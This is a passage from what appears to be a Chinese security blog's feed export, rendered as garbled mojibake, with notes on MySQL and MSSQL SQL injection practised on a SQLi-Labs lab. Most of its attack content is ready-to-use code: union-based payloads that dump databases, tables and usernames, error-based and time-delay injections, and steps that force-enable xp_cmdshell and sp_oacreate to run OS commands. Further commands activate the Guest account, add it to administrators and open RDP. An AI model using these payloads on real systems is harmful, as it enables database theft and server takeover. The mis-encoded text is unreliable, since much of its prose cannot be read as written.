class="keyword">select</span>åªèƒ½æŸ¥è¯¢ä¸¤ä¸ªè¡¨ä¸­å…±åŒéƒ½æœ‰çš„å­—æ®µï¼Œå¦‚æœä¸€ä¸ªå­—æ®µåœ¨å¦å¤–ä¸€ä¸ªè¡¨ä¸­æ²¡æœ‰ï¼Œå°±ä¼šæŠ¥é”™</span><br><span class="line"></span><br><span class="line">å¦‚usersè¡¨æ¯”users2è¡¨å¤šäº†schoolå­—æ®µï¼ŒæŸ¥è¯¢usersè¡¨ä¸­çš„schoolå’Œusers2è¡¨ä¸­çš„addressï¼Œå› ä¸ºusers2è¡¨ä¸­æ²¡æœ‰schoolå­—æ®µï¼Œæ‰€ä»¥æŠ¥é”™</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">2.</span>(<span class="keyword">union</span>) <span class="keyword">select</span> æŸ¥è¯¢çš„å­—æ®µæ•°è¦ä¸€è‡´ï¼Œå¦åˆ™ä¼šæŠ¥é”™</span><br><span class="line">æ‰€ä»¥éœ€è¦å…ˆç”¨<span class="keyword">order</span> <span class="keyword">by</span>æ¥åˆ¤æ–­å­—æ®µæ•°</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.union è‡ªå¸¦å»é‡åŠŸèƒ½ï¼ˆdistinctçš„åŠŸèƒ½ï¼‰</span><br><span class="line"></span><br><span class="line">å¦‚æœä¸æƒ³è¦å»é‡å¯ä»¥ä½¿ç”¨union all</span><br></pre></td></tr></table></figure><h4 id="select-1-2-3"><a href="#select-1-2-3" class="headerlink" title="select 1,2,3"></a>select 1,2,3</h4><p> selectæ—¶ä¸å†™åé¢çš„è¡¨åï¼Œè¿™æ—¶selectå®é™…ä¸Šæ²¡æœ‰å‘ä»»ä½•ä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢æ•°æ®ï¼Œå³æŸ¥è¯¢å‘½ä»¤ä¸æŒ‡å‘ä»»ä½•æ•°æ®åº“çš„è¡¨ã€‚è¿”å›å€¼å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸ªæ•°ç»„ã€‚</p><p><img src="/../images/image-20230522123755808-1687276382008.png" alt="image-20230522123755808"></p><p>é€šè¿‡è¿™ä¸ªå’Œunion select</p><h5 id="æ„é€ ä¸´æ—¶æ•°æ®"><a href="#æ„é€ ä¸´æ—¶æ•°æ®" class="headerlink" title="æ„é€ ä¸´æ—¶æ•°æ®"></a>æ„é€ ä¸´æ—¶æ•°æ®</h5><p><img src="/../images/image-20230522124110552-1687276382007.png" alt="image-20230522124110552"></p><p>usersè¡¨ä¸­å¹¶æ²¡æœ‰è¦æŸ¥è¯¢çš„æ•°æ®,ä½†æ˜¯å´è¿”å›äº†æˆ‘ä»¬æ„é€ çš„æ•°æ®!</p><p><img src="/../images/image-20230522124150917-1687276382008.png" alt="image-20230522124150917"></p><p>è€Œåœ¨ä¸‹ä¸€æ¬¡æŸ¥è¯¢ä¸­ï¼Œè¿™ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„æ•°æ®ä¸å­˜åœ¨ï¼Œè¯´æ˜é€šè¿‡è¿™æ ·æ–¹å¼åˆ›å»ºçš„æ•°æ®çš„å­˜æ´»å‘¨æœŸåªåœ¨å…¶æŸ¥è¯¢è¯­å¥æ‰§è¡Œæ—¶</p><p>æ‰€ä»¥é€šè¿‡ä¸Šè¿°æ“ä½œå°±å¯ä»¥ä¸´æ—¶æ„é€ ä¸€ä¸ªç”¨æˆ·ï¼Œè¾¾åˆ°ç™»å½•çš„æ•ˆæœ</p><h5 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h5><p><strong>éœ€è¦å°†å‰é¢çš„selectè¯­å¥è®¾ç½®ä¸ºå‡</strong>ï¼Œæ‰èƒ½ä½¿ç”¨åé¢çš„union select 1,2,3æ¥åˆ¤æ–­å“ªä¸€ä¸ªå­—æ®µå€¼æ˜¯å›æ˜¾çš„ï¼Œæ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚ï¼ˆåŸå› æ˜¯ä¸€èˆ¬è·å–çš„æ˜¯ç¬¬ä¸€ä¸ªç»“æœï¼Œè€Œæˆ‘ä»¬æ„é€ çš„union select 1,2,3åœ¨ä¹‹åï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522124339221-1687276382008.png" alt="image-20230522124339221"></p><h5 id="select-XXå’Œè¡¨å"><a href="#select-XXå’Œè¡¨å" class="headerlink" title="select+XXå’Œè¡¨å"></a>select+XXå’Œè¡¨å</h5><p>åˆ—æ•°å–å†³äºæˆ‘ä»¬è¾“å…¥çš„æ•°å­—ä¸ªæ•°ï¼Œè¡Œæ•°å–å†³äºè¡¨åŸæ¥çš„è¡Œæ•°ã€‚</p><p><img src="/../images/image-20230522124413676-1687276382008.png" alt="image-20230522124413676"></p><h3 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h3><img src="E:\typora img\image-20230406175143769.png" alt="image-20230406175143769" style="zoom:150%;" /><ul><li><p>å•è¡Œæ³¨é‡Šç¬¦</p><ul><li><p>â€“+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®è´¨ä¸Š--æ˜¯èµ·åˆ°æ³¨é‡Šçš„ä½œç”¨ï¼Œä½†æ˜¯åœ¨sqlä¸­ç”¨--æ³¨é‡Šåé¢å¿…é¡»åŠ ä¸€ä¸ªç©ºæ ¼--æ‰ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure></li><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨URLä¸­#è¡¨ç¤ºé”šç‚¹ï¼Œå¸¦ä¸Š#ä¸ä¼šè¯·æ±‚åç«¯è·¯ç”±ï¼Œè€Œæ˜¯åˆ·æ–°å‰ç«¯è·¯ç”±ï¼Œæ‰€ä»¥</span><br><span class="line">æµ‹è¯•ä¸€èˆ¬ç”¨URLç¼–ç åçš„%23</span><br></pre></td></tr></table></figure></li></ul></li><li><p>å¤šè¡Œæ³¨é‡Šç¬¦</p><ul><li><p>&#x2F;*   *&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨äºæ³¨é‡Šå¤šè¡Œ</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   */</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="and-ä¸-or"><a href="#and-ä¸-or" class="headerlink" title="and ä¸ or"></a>and ä¸ or</h3><p><img src="/../images/image-20230522124632240-1687276382008.png" alt="image-20230522124632240"></p><h3 id="åå¼•å·"><a href="#åå¼•å·" class="headerlink" title="åå¼•å·"></a>åå¼•å·</h3><p>åå¼•å·æ˜¯ mysql çš„è½¬ä¹‰ç¬¦ï¼Œåªè¦ä½ ä¸åœ¨åˆ—åã€è¡¨åä¸­ä½¿ç”¨ mysql çš„ä¿ç•™å­—æˆ–ä¸­æ–‡ï¼Œå°±ä¸éœ€è¦è½¬ä¹‰ã€‚<br>å…¶ä»–æ•°æ®åº“ä¹ŸåŒæ ·æœ‰ä¿ç•™å­—ï¼Œå¦‚æœä½¿ç”¨çš„è¯ä¹ŸåŒæ ·éœ€è¦è½¬ä¹‰ï¼Œåªæ˜¯è½¬ä¹‰ç¬¦ä¸åŒè€Œå·²ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#å‡å¦‚è¡¨Aä¸­æœ‰ä¸€åˆ—åä¸º<span class="keyword">select</span>ï¼ŒæŸ¥è¯¢è¯¥åˆ—</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">select</span> <span class="keyword">from</span> A;   #é”™è¯¯</span><br><span class="line"><span class="keyword">select</span> `<span class="keyword">select</span>` <span class="keyword">from</span> A;  #æ­£ç¡®</span><br><span class="line"></span><br><span class="line">#å‡å¦‚å­˜åœ¨è¡¨flagï¼Œç”¨<span class="keyword">desc</span>(<span class="keyword">describe</span>)æŸ¥è¯¢è¯¥è¡¨ä¿¡æ¯</span><br><span class="line"><span class="keyword">desc</span> flag A;  #æ˜¾ç¤ºflagè¡¨ä¿¡æ¯ï¼Œåˆ«åä¸ºA</span><br><span class="line"><span class="keyword">desc</span> `flag` `A` #ä¸ä¸Šè¿°è¯­å¥ç›¸åŒ</span><br></pre></td></tr></table></figure><p>MySQL å…³é”®å­—å’Œä¿ç•™å­—æ±‡æ€»ï¼ˆMySQL 8.0ï¼‰ï¼š</p><p><a href="https://blog.csdn.net/m0_56921622/article/details/122975904">https://blog.csdn.net/m0_56921622/article/details/122975904</a></p><h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p><code>AS</code>å‘½ä»¤ç”¨äºä½¿ç”¨åˆ«åé‡å‘½ååˆ—æˆ–è¡¨ã€‚</p><p>åˆ«åä»…åœ¨æŸ¥è¯¢æœŸé—´å­˜åœ¨ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é‡å‘½åè¡¨å</span><br><span class="line"><span class="keyword">select</span> c.ID <span class="keyword">from</span> users <span class="keyword">as</span> c</span><br><span class="line">é‡å‘½ååˆ—å</span><br><span class="line"><span class="keyword">select</span> c.ID <span class="keyword">as</span> ID2 <span class="keyword">from</span> users <span class="keyword">as</span> c</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šå¯ä»¥æŠŠ<span class="keyword">as</span>çœç•¥ï¼Œå³<span class="keyword">select</span> c.ID <span class="keyword">from</span> users cç­‰ä»·äº<span class="keyword">select</span> c.ID <span class="keyword">from</span> users <span class="keyword">as</span> c</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220701112525082-1687276382008.png" alt="image-20220701112525082"></p><p>åœ¨sqlæ³¨å…¥å¯ä»¥ç”¨äºæ— åˆ—åæ³¨å…¥</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlæ³¨å…¥--MSSQL</title>
      <link href="/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BSqlserver%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BSqlserver%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><ul><li><p>cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¡¥ä¸ï¼škb4474419 # æ‰“äº†æ‰èƒ½è£…vmtools</span><br><span class="line"></span><br><span class="line">æœåŠ¡å™¨ç®¡ç†å™¨æ·»åŠ è§’è‰²IIS</span><br><span class="line">è®°å¾—å‹¾é€‰.netå¼€å‘</span><br><span class="line">IISç®¡ç†å™¨æ·»åŠ ç½‘ç«™ï¼Œå¼€å¯çˆ¶è·¯å¾„</span><br></pre></td></tr></table></figure></li><li><p>Sqlserver  2008</p><p><a href="https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe">https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯†ç ï¼šSA123@</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SQLServerManager10</span><br><span class="line">å¼€å¯TCP/IP</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516132937292-1697520279847.png" alt="image-20230516132937292"></p></li><li><p><a href="https://github.com/Larryxi/MSSQL-SQLi-Labs">https://github.com/Larryxi/MSSQL-SQLi-Labs</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ•°æ®åº“test</span><br><span class="line">ä¿®æ”¹æ•°æ®åº“é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure></li></ul><h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><h2 id="ç³»ç»Ÿæ•°æ®åº“"><a href="#ç³»ç»Ÿæ•°æ®åº“" class="headerlink" title="ç³»ç»Ÿæ•°æ®åº“"></a>ç³»ç»Ÿæ•°æ®åº“</h2><ul><li><code>master</code> ï¼šmasteræ•°æ®åº“æ§åˆ¶SQL Serverçš„æ‰€æœ‰æ–¹é¢ã€‚è¿™ä¸ªæ•°æ®åº“ä¸­åŒ…æ‹¬æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ã€ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€å½“å‰æ­£åœ¨æœåŠ¡å™¨ä¸­è¿è¡Œçš„è¿‡ç¨‹çš„ä¿¡æ¯ã€‚</li><li><code>model</code>ï¼šSQL Serverä¸ºç”¨æˆ·æ•°æ®åº“æä¾›çš„æ ·æ¿ï¼Œæ–°çš„ç”¨æˆ·æ•°æ®åº“éƒ½ä»¥modelæ•°æ®åº“ä¸ºåŸºç¡€</li><li><code>msdb</code>   ï¼šç”± Enterprise Managerå’ŒAgentä½¿ç”¨ï¼Œè®°å½•ç€ä»»åŠ¡è®¡åˆ’ä¿¡æ¯ã€äº‹ä»¶å¤„ç†ä¿¡æ¯ã€æ•°æ®å¤‡ä»½åŠæ¢å¤ä¿¡æ¯ã€è­¦å‘ŠåŠå¼‚å¸¸ä¿¡æ¯ã€‚</li><li><code>tempdb</code>  ï¼šå®ƒä¸ºä¸´æ—¶è¡¨å’Œå…¶ä»–ä¸´æ—¶å·¥ä½œæä¾›äº†ä¸€ä¸ªå­˜å‚¨åŒºã€‚ä¾‹å¦‚ï¼Œæ’åºæ—¶è¦ç”¨åˆ°tempdbæ•°æ®åº“ã€‚æ•°æ®è¢«æ”¾è¿›tempdbæ•°æ®åº“ï¼Œæ’å®Œåºåå†æŠŠç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚æ¯æ¬¡SQL Serveré‡æ–°å¯åŠ¨ï¼Œå®ƒéƒ½ä¼šæ¸…ç©ºtempdbæ•°æ®åº“å¹¶é‡å»ºã€‚æ°¸è¿œä¸è¦åœ¨tempdbæ•°æ®åº“å»ºç«‹éœ€è¦æ°¸ä¹…ä¿å­˜çš„è¡¨ã€‚</li></ul><h2 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h2><ul><li><code>saï¼ˆSysAdminï¼‰</code>æƒé™ï¼šæ•°æ®åº“æ“ä½œï¼Œæ–‡ä»¶ç®¡ç†ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œæ³¨å†Œè¡¨è¯»å–ç­‰systemã€‚SQLServeræ•°æ®åº“çš„æœ€é«˜æƒé™</li><li><code>dbï¼ˆDatabase_ownerï¼‰</code>æƒé™ï¼šæ–‡ä»¶ç®¡ç†ï¼Œæ•°æ®åº“æ“ä½œç­‰æƒé™ users-administrators</li><li><code>public</code>æƒé™ï¼šæ•°æ®åº“æ“ä½œ guest-users</li></ul><h2 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure><h2 id="å˜é‡å’Œå‡½æ•°"><a href="#å˜é‡å’Œå‡½æ•°" class="headerlink" title="å˜é‡å’Œå‡½æ•°"></a>å˜é‡å’Œå‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@VERSION</span><br><span class="line">@@servername  -- æœåŠ¡å™¨å</span><br><span class="line">host_name() -- ä¸»æœºå</span><br><span class="line"></span><br><span class="line">-- åˆ¤æ–­ç«™åº“åˆ†ç¦»</span><br><span class="line">host_name()==@@servername</span><br><span class="line"></span><br><span class="line">db_name()  -- å½“å‰æ•°æ®åº“</span><br><span class="line">db_name(num) -- éå†å…¶ä»–æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">user</span><br><span class="line">user_name()</span><br><span class="line"></span><br><span class="line">is_srvrolemember(&#x27;sysadmin&#x27;)     -- åˆ¤æ–­æ˜¯å¦æ˜¯SAæƒé™</span><br><span class="line">is_member(&#x27;db_owner&#x27;)  -- åˆ¤æ–­æ˜¯å¦æ˜¯db_owneræƒé™</span><br><span class="line">is_srvrolemember(&#x27;public&#x27;) -- åˆ¤æ–­æ˜¯å¦æ˜¯publicæƒé™</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®è¡¨"><a href="#æ•°æ®è¡¨" class="headerlink" title="æ•°æ®è¡¨"></a>æ•°æ®è¡¨</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">master..sysdatabases -- å­˜æ”¾æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">master..sysobjects --  å­˜æ”¾æ‰€æœ‰æ•°æ®è¡¨</span><br><span class="line"></span><br><span class="line">-- å­—æ®µåä¸ºname</span><br><span class="line"></span><br><span class="line">select name from master..sysobjects where xtype=&#x27;U&#x27; -- æŸ¥è¯¢ç”¨æˆ·è‡ªå»ºè¡¨</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dbname].information_schema.columns  -- dbçš„æ‰€æœ‰å­—æ®µ</span><br><span class="line"></span><br><span class="line">å­—æ®µåtable_name,column_name</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dbname].information_schema.tables  -- dbçš„æ‰€æœ‰è¡¨</span><br><span class="line"></span><br><span class="line">å­—æ®µåtable_name</span><br></pre></td></tr></table></figure><h2 id="è¯­å¥"><a href="#è¯­å¥" class="headerlink" title="è¯­å¥"></a>è¯­å¥</h2><table><thead><tr><th align="center">SqlServer(mssql)</th><th align="center">Mysql</th></tr></thead><tbody><tr><td align="center">select top 1 name from users</td><td align="center">select  name from users limit 0,1</td></tr></tbody></table><h1 id="æ³¨å…¥æ‰‹æ®µ"><a href="#æ³¨å…¥æ‰‹æ®µ" class="headerlink" title="æ³¨å…¥æ‰‹æ®µ"></a>æ³¨å…¥æ‰‹æ®µ</h1><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><blockquote><p>åˆ©ç”¨æ˜¾ç¤ºæˆ–éšå¼è½¬æ¢æ¥æŠ¥é”™æ³¨å…¥</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1 (select CAST(USER as int))</span><br><span class="line"></span><br><span class="line">select * from admin where id =1 (select convert(int,user))</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230515211249595-1697520285581.png" alt="image-20230515211249595"></p><h2 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h2><ul><li><p>åˆ¤æ–­å­—æ®µ</p><p><img src="/../images/image-20230515174430619-1697520287732.png" alt="image-20230515174430619"></p></li><li><p>æŸ¥æ‰¾å›æ˜¾</p><p><img src="/../images/image-20230515174542376-1697520288977.png" alt="image-20230515174542376"></p></li><li><p>çˆ†åº“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,db_name(num)--</span><br></pre></td></tr></table></figure></li><li><p>çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; and name!=&#x27;[ç¬¬ä¸€æ¡è·å¾—çš„è¡¨å]&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; and name not in ([å‰é¢çš„è¡¨]) --</span><br></pre></td></tr></table></figure></li><li><p>çˆ†å­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME and COLUMN_NAME!=&#x27;id&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME not in (&#x27;id&#x27;,&#x27;username&#x27;) --</span><br></pre></td></tr></table></figure><ul><li>çˆ†å­—æ®µå€¼</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from &#x27;users&#x27; --</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1 1,2,username from users where username!=&#x27;Dumb&#x27;--</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1 1,2,username from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelina&#x27;)--</span><br></pre></td></tr></table></figure></li></ul><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>é»˜è®¤å¼€å¯</p><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(xxx) waitfor delay &#x27;0:0:2&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>0:0:2</p><p>å°æ—¶:åˆ†é’Ÿ:ç§’</p></blockquote><h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h2 id="ç»å¯¹è·¯å¾„ğŸ”"><a href="#ç»å¯¹è·¯å¾„ğŸ”" class="headerlink" title="ç»å¯¹è·¯å¾„ğŸ”"></a>ç»å¯¹è·¯å¾„ğŸ”</h2><blockquote><p><code>xp_dirtree</code> æ˜¯ä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼ˆstored procedureï¼‰ï¼Œå®ƒæ˜¯ Microsoft SQL Server æ•°æ®åº“å¼•æ“æä¾›çš„ä¸€ä¸ªå†…ç½®è¿‡ç¨‹ã€‚è¯¥è¿‡ç¨‹å¯ç”¨äºæ‰§è¡Œæ–‡ä»¶ç³»ç»Ÿç›®å½•æ ‘æ‰«ææ“ä½œã€‚</p><p>ä½¿ç”¨ <code>xp_dirtree</code> å­˜å‚¨è¿‡ç¨‹ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œç„¶åæ‰§è¡Œé€’å½’æ‰«æè¯¥è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œå¹¶å°†ç»“æœä»¥è¡¨æ ¼å½¢å¼è¿”å›ç»™ç”¨æˆ·</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; //åˆ—å‡ºæ‰€æœ‰c:\æ–‡ä»¶å’Œç›®å½•,å­ç›®å½• </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 //åªåˆ—c:\æ–‡ä»¶å¤¹ </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 //åˆ—c:\æ–‡ä»¶å¤¹åŠ æ–‡ä»¶ </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line"></span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#x27;c:&#x27;,1,1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line"></span><br><span class="line">insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../../../../../blog/source/images/image-20230515213216038-1694613900373.png" alt="image-20230515213216038"></p><h2 id="SAæƒé™"><a href="#SAæƒé™" class="headerlink" title="SAæƒé™"></a>SAæƒé™</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><ul><li><p>æ˜¯å¦å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) FROM master..sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27; </span><br><span class="line"></span><br><span class="line">è¿”å›å€¼ä¸º1 â†’ å¼€å¯</span><br></pre></td></tr></table></figure></li><li><p>å¼ºåˆ¶å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- å°†è¯¥é€‰é¡¹çš„å€¼è®¾ç½®ä¸º1</span><br><span class="line">execute(&#x27;sp_configure &quot;show advanced options&quot;,1&#x27;)  </span><br><span class="line">-- ä¿å­˜è®¾ç½®</span><br><span class="line">execute(&#x27;reconfigure&#x27;) </span><br><span class="line">-- å°†xp_cmdshellçš„å€¼è®¾ç½®ä¸º1</span><br><span class="line">execute(&#x27;sp_configure &quot;xp_cmdshell&quot;, 1&#x27;) </span><br><span class="line">-- ä¿å­˜è®¾ç½®</span><br><span class="line">execute(&#x27;reconfigure&#x27;)                             </span><br></pre></td></tr></table></figure></li><li><p>æ¢å¤è¢«åˆ é™¤çš„<code>xp_cmdshell</code></p><p>ä¸‹è½½ï¼š<a href="https://cn.dll-files.com/xplog70.dll.html">https://cn.dll-files.com/xplog70.dll.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exec master.dbo.sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;D:\\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure></li><li><p>å‘½ä»¤æ‰§è¡Œâ€“æœ‰å›æ˜¾ï¼ˆè¿”å›å‘½ä»¤ç»“æœï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute(&#x27;xp_cmdshell &quot;whoami&quot;&#x27;) </span><br></pre></td></tr></table></figure></li><li><p>è·å¾—ä¸»æœºæƒé™</p><blockquote><p>ç‰ˆæœ¬é—®é¢˜ï¼Ÿï¼Ÿ</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net user Guest 123456&#x27;              --ç»™guestç”¨æˆ·è®¾ç½®å¯†ç </span><br><span class="line">exec xp_cmdshell &#x27;net user Guest /active:yes&#x27;         --æ¿€æ´»guestç”¨æˆ·</span><br><span class="line">exec xp_cmdshell &#x27;net localgroup administrators Guest /add&#x27;  --å°†guestç”¨æˆ·æ·»åŠ åˆ°administratorsç”¨æˆ·ç»„</span><br><span class="line">exec xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;        --å¼€å¯3389ç«¯å£</span><br></pre></td></tr></table></figure></li></ul><h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><ul><li><p>æ˜¯å¦å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br><span class="line"></span><br><span class="line">è¿”å›å€¼ä¸º1 â†’ å¼€å¯</span><br></pre></td></tr></table></figure></li><li><p>å¼ºåˆ¶å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure></li><li><p>å‘½ä»¤æ‰§è¡Œâ€“æ— å›æ˜¾ï¼ˆä¸è¿”å›å‘½ä»¤ç»“æœï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt; e:\\test2.txt&#x27;</span><br></pre></td></tr></table></figure></li></ul><h3 id="CLRåŠŸèƒ½"><a href="#CLRåŠŸèƒ½" class="headerlink" 